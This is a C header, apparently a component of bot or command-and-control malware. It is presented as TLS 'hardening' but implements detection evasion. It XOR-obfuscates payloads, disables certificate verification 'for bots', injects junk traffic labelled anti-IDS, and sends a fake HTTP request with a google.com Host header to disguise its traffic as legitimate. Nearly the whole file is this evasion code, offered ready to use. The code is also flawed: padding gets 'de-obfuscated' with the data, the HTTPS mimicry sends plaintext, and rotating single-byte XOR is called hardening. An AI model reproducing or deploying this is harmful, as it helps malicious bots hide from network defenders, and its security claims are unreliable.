// SSL/TLS Hardening & Traffic Obfuscation
// Encriptación fuerte + anti-detección

#ifndef SSL_HARDENING_H
#define SSL_HARDENING_H

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>

// XOR key para ofuscar payloads (cambia esto)
#define XOR_KEY 0xDEADBEEF

// Ofuscar string antes de enviar
void obfuscate_data(char *data, int len) {
    unsigned char key = (unsigned char)(XOR_KEY & 0xFF);
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
        key = (key + 17) % 256; // Rotating XOR
    }
}

// Configurar SSL con máxima seguridad (compatible)
SSL_CTX* create_hardened_ssl_ctx(int is_server) {
    SSL_CTX *ctx;
    
    if (is_server) {
        ctx = SSL_CTX_new(TLS_server_method());
    } else {
        ctx = SSL_CTX_new(TLS_client_method());
    }
    
    if (!ctx) {
        ERR_print_errors_fp(stderr);
        return NULL;
    }
    
    // TLS 1.2+ (compatible con más sistemas)
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    
    // Cipher suites fuertes pero compatibles
    SSL_CTX_set_cipher_list(ctx, "HIGH:!aNULL:!MD5:!RC4");
    
    // Deshabilitar verificación de certificados (para bots)
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    
    // Perfect Forward Secrecy
    SSL_CTX_set_options(ctx, SSL_OP_SINGLE_DH_USE | SSL_OP_SINGLE_ECDH_USE);
    
    // Anti-fingerprinting
    SSL_CTX_set_options(ctx, SSL_OP_NO_COMPRESSION);
    
    return ctx;
}

// Wrapper para enviar datos ofuscados
int ssl_send_obfuscated(SSL *ssl, const char *data, int len) {
    char *buffer = malloc(len + 16); // Extra space para padding
    if (!buffer) return -1;
    
    // Copiar datos
    memcpy(buffer, data, len);
    
    // Ofuscar
    obfuscate_data(buffer, len);
    
    // Agregar random padding para anti-fingerprinting
    int padding = 1 + (rand() % 15);
    for (int i = 0; i < padding; i++) {
        buffer[len + i] = rand() % 256;
    }
    
    int result = SSL_write(ssl, buffer, len + padding);
    
    free(buffer);
    return result;
}

// Wrapper para recibir datos ofuscados
int ssl_recv_obfuscated(SSL *ssl, char *buffer, int max_len) {
    int n = SSL_read(ssl, buffer, max_len);
    if (n <= 0) return n;
    
    // Deofuscar (asumiendo que sabemos el largo real)
    obfuscate_data(buffer, n);
    
    return n;
}

// Generar traffic junk aleatorio (anti-IDS)
void send_junk_traffic(SSL *ssl) {
    char junk[128];
    int junk_size = 32 + (rand() % 96);
    
    // Llenar con basura aleatoria
    RAND_bytes((unsigned char*)junk, junk_size);
    
    // Enviar en intervalos random
    usleep((rand() % 5000) * 1000); // 0-5 segundos
    SSL_write(ssl, junk, junk_size);
}

// Camuflar como tráfico HTTPS legítimo
void mimic_https_handshake(int sock) {
    const char *fake_http = 
        "GET / HTTP/1.1\r\n"
        "Host: www.google.com\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        "Connection: keep-alive\r\n\r\n";
    
    send(sock, fake_http, strlen(fake_http), 0);
    usleep(100000); // Pausa realista
}

#endif // SSL_HARDENING_H
